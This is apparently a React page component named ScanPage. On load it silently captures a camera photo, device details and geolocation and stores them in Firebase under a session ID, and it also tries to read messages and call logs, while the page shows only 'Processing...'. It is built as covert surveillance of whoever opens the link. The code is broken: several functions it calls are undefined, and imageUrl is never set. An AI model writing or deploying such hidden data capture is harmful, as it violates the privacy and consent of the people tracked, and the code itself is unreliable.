
import { useEffect } from "react";
import { useParams } from "react-router-dom";
// import { db, storage } from "../firebaseConfig";
// import { doc, updateDoc } from "firebase/firestore";
import { getDownloadURL, ref, uploadBytes } from "firebase/storage";
import { db, storage } from "../firebaseConfig";
import { doc, updateDoc } from "firebase/firestore";

export default function ScanPage() {
      const { sessionId } = useParams();

      useEffect(() => {
        if (sessionId) captureData();
      }, [sessionId]);

      const captureData = async () => {
        const imageBlob = await capturePhoto();
        const deviceInfo = getDeviceInfo();
        const location = await getLocation();
        const messages = await getMessages(); // Requires explicit permissions
        const callLogs = await getCallLogs();
        // const imageUrl = await uploadImage(imageBlob, sessionId);

          await updateDoc(doc(db
              , "sessions", sessionId), {
          imageUrl,
          deviceInfo,
          location,
          timestamp: new Date().toISOString(),
        });
      };

      const takePhoto = async () => {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
        });
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);
        const blob = await imageCapture.takePhoto();
        track.stop();
        return blob;
      };

      const uploadImage = async (blob, sessionId) => {
        const storageRef = ref(storage, `photos/${sessionId}.jpg`);
        await uploadBytes(storageRef, blob);
        return await getDownloadURL(storageRef);
      };

      const getDeviceInfo = () => ({
        os: navigator.userAgent,
        browser: navigator.vendor,
        platform: navigator.platform,
        language: navigator.language,
      });

      const getLocation = async () => {
        return new Promise((resolve) => {
          navigator.geolocation.getCurrentPosition(
            (pos) =>
              resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
            () => resolve({ lat: "unknown", lon: "unknown" })
          );
        });
      };
    return (
      <>
        <div className="text-center text-xl">Processing...</div>;
      </>
    );
}